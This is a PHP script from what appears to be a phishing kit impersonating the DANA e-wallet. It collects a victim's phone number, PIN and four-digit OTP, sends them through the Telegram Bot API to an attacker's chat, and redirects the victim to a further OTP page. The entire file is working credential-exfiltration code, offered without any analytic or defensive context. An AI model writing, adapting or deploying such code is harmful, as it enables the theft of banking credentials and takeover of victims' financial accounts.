<?php
include "../manyu/data.php";
session_start();

$pin = $_SESSION['pin'];
$otp1 = $_POST['otp1'];
$otp2 = $_POST['otp2'];
$otp3 = $_POST['otp3'];
$otp4 = $_POST['otp4'];
$otp = $otp1.$otp2.$otp3.$otp4;

$_SESSION['otp'] = $otp;

$nomor = $_SESSION['nomor'];
$pin = $_SESSION['pin'];

$message = "
( DANA | OTP ".$otp." )

- No HP : ".$nomor."
- PIN : ".$pin."
- Code OTP  : ".$otp."
 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../otp1.php');
?>
